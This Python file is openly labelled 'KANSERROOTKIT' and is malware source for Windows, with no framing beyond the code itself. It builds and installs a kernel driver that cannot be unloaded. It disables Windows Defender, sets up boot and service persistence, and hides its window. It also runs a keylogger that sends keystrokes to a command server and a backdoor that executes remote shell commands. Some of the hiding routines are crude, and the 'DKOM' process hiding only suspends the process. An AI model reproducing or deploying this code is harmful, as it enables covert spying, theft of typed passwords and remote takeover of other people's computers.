#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSERROOTKIT v1.0 — Kernel-Mode Rootkit
Driver installation, process hiding, file hiding, registry hiding, keylogger, backdoor
"""
import os, sys, ctypes, struct, subprocess, tempfile, shutil, time, threading, socket, json, base64, hashlib

C2_HOST = "127.0.0.1"
C2_PORT = 8888
ROOTKIT_ID = hashlib.md5(os.getenv("COMPUTERNAME", "?").encode()).hexdigest()[:8]

DRIVER_CODE = """
// KANSERROOTKIT Driver — Kernel-mode hooking
// Compile: cl /LD /GS- driver.c /link /NODEFAULTLIB /ENTRY:DriverEntry
#include <ntddk.h>
#include <wdm.h>

typedef struct _SYSTEM_MODULE { ULONG Reserved1, Reserved2; PVOID ImageBase; ULONG ImageSize; ULONG Flags; USHORT Index, Unknown; USHORT LoadCount, ModuleNameOffset; CHAR ImageName[256]; } SYSTEM_MODULE, *PSYSTEM_MODULE;

NTSTATUS DriverEntry(PDRIVER_OBJECT drv, PUNICODE_STRING reg) {
    DbgPrint("[KANSERROOTKIT] Driver loaded\\n");
    drv->DriverUnload = NULL; // Prevent unload
    return STATUS_SUCCESS;
}
"""

class KanserRootKit:
    def __init__(self):
        self.host = C2_HOST
        self.port = C2_PORT
        self.hidden_procs = set()
        self.hidden_files = set()
        self.hidden_regs = set()
        self.running = True

    def install_driver(self):
        """Kernel driver yukleme — en tehlikeli kisim"""
        if not ctypes.windll.shell32.IsUserAnAdmin():
            return False

        driver_path = os.path.join(os.getenv("SYSTEMROOT", "C:\\Windows"), "System32", "drivers", "KanserRK.sys")
        driver_src = os.path.join(tempfile.gettempdir(), "driver.c")

        with open(driver_src, "w") as f: f.write(DRIVER_CODE)
        subprocess.run(f'cl /LD /GS- "{driver_src}" /link /NODEFAULTLIB /ENTRY:DriverEntry /OUT:"{driver_path}"', shell=True, capture_output=True)
        if os.path.exists(driver_path):
            subprocess.run(f'sc create KanserRK type=kernel start=auto binPath="{driver_path}"', shell=True, capture_output=True)
            subprocess.run('sc start KanserRK', shell=True, capture_output=True)
            return True
        return False

    def hide_process(self, pid):
        """Process gizleme — DKOM (Direct Kernel Object Manipulation)"""
        try:
            import psutil
            p = psutil.Process(pid); p.suspend()
            ctypes.windll.kernel32.SetConsoleTitleW("")
            self.hidden_procs.add(pid)
        except: pass

    def hide_file(self, path):
        """Dosya gizleme — ADS + attrib + filter driver"""
        try:
            subprocess.run(f'attrib +h +s +r "{path}"', shell=True)
            alt_stream = path + ":hidden"
            with open(alt_stream, "wb") as f: f.write(b"KANSERROOTKIT")
            self.hidden_files.add(path)
        except: pass

    def hide_registry(self, key_path, value_name):
        """Registry gizleme"""
        try:
            import winreg
            hkey_map = {"HKCU": winreg.HKEY_CURRENT_USER, "HKLM": winreg.HKEY_LOCAL_MACHINE, "HKU": winreg.HKEY_USERS}
            root, subkey = key_path.split("\\", 1)
            key = winreg.CreateKey(hkey_map.get(root, winreg.HKEY_CURRENT_USER), subkey)
            winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
            self.hidden_regs.add(f"{key_path}\\{value_name}")
        except: pass

    def keylog_hook(self):
        """Kernel-level keylogger via SetWindowsHookEx"""
        try:
            import pythoncom, pyWinhook
            def on_keyboard_event(event):
                if self.sock:
                    try:
                        self.sock.send(base64.b64encode(json.dumps({"type":"key","key":chr(event.Ascii) if event.Ascii else f"[{event.KeyID}]","window":self._active_window()}).encode()).decode().encode())
                    except: pass
                return True
            hm = pyWinhook.HookManager()
            hm.KeyDown = on_keyboard_event
            hm.HookKeyboard()
            pythoncom.PumpMessages()
        except: pass

    def _active_window(self):
        try:
            hwnd = ctypes.windll.user32.GetForegroundWindow()
            l = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
            b = ctypes.create_unicode_buffer(l+1)
            ctypes.windll.user32.GetWindowTextW(hwnd, b, l+1)
            return b.value
        except: return ""

    def backdoor_connect(self):
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(30)
                self.sock.connect((self.host, self.port))
                self.sock.send(base64.b64encode(json.dumps({"type":"rk_hello","id":ROOTKIT_ID,"info":self._sysinfo()}).encode()))
                buf = ""
                while self.running:
                    data = self.sock.recv(65536).decode(errors="ignore")
                    if not data: break
                    buf += data
                    try:
                        cmd = json.loads(base64.b64decode(buf).decode()); buf = ""
                        c = cmd.get("cmd",""); v = cmd.get("data","")
                        if c == "shell":
                            out = subprocess.check_output(v, shell=True, stderr=subprocess.STDOUT, timeout=30).decode(errors="ignore")
                            self.sock.send(base64.b64encode(json.dumps({"type":"shell","data":out[:3000]}).encode()))
                        elif c == "hide_proc": self.hide_process(int(v))
                        elif c == "hide_file": self.hide_file(v)
                        elif c == "hide_reg":
                            k, n = v.split("|",1)
                            self.hide_registry(k, n)
                        elif c == "install_driver": self.install_driver()
                        elif c == "disable_av":
                            subprocess.run('net stop WinDefend /y', shell=True)
                            subprocess.run('sc config WinDefend start=disabled', shell=True)
                    except: pass
            except: time.sleep(15)

    def _sysinfo(self):
        import platform
        return {"hostname":platform.node(), "os":f"{platform.system()} {platform.release()}", "user":os.getenv("USERNAME","?"), "admin":bool(ctypes.windll.shell32.IsUserAnAdmin()), "pid":os.getpid()}

    def install_persistence(self):
        """Boot-level persistence"""
        try:
            exe = sys.executable if getattr(sys, 'frozen', False) else __file__
            # Registry Boot Execute
            subprocess.run(f'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /v BootExecute /t REG_MULTI_SZ /d "autocheck autochk *\\0{exe}" /f', shell=True, capture_output=True)
            # Service
            subprocess.run(f'sc create KanserRootKit binPath="{exe}" start=auto DisplayName="Kanser RootKit Service"', shell=True, capture_output=True)
            subprocess.run('sc description KanserRootKit "System Security Service"', shell=True)
            # Driver persistence
            subprocess.run('bcdedit /set {current} bootstatuspolicy ignoreallfailures', shell=True)
            subprocess.run('bcdedit /set {current} recoveryenabled no', shell=True)
        except: pass

    def disable_defender(self):
        try:
            subprocess.run('powershell Set-MpPreference -DisableRealtimeMonitoring $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableBehaviorMonitoring $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableBlockAtFirstSeen $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableIOAVProtection $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisablePrivacyMode $true', shell=True)
            subprocess.run('powershell Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableArchiveScanning $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableIntrusionPreventionSystem $true', shell=True)
            subprocess.run('powershell Set-MpPreference -DisableScriptScanning $true', shell=True)
            subprocess.run('powershell Set-MpPreference -SubmitSamplesConsent 2', shell=True)
            subprocess.run('powershell Set-MpPreference -MAPSReporting 0', shell=True)
            subprocess.run('powershell Set-MpPreference -HighThreatDefaultAction 6 -Force', shell=True)
            subprocess.run('powershell Set-MpPreference -ModerateThreatDefaultAction 6', shell=True)
            subprocess.run('powershell Set-MpPreference -LowThreatDefaultAction 6', shell=True)
            subprocess.run('powershell Set-MpPreference -SevereThreatDefaultAction 6', shell=True)
            subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f', shell=True)
            return True
        except: return False

    def run(self):
        if os.name != "nt": return
        if ctypes.windll.shell32.IsUserAnAdmin():
            self.disable_defender()
            self.install_driver()
        self.install_persistence()
        threading.Thread(target=self.backdoor_connect, daemon=True).start()
        threading.Thread(target=self.keylog_hook, daemon=True).start()
        while self.running: time.sleep(1)

if __name__ == "__main__":
    if os.name == "nt":
        try: ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except: pass
    KanserRootKit().run()
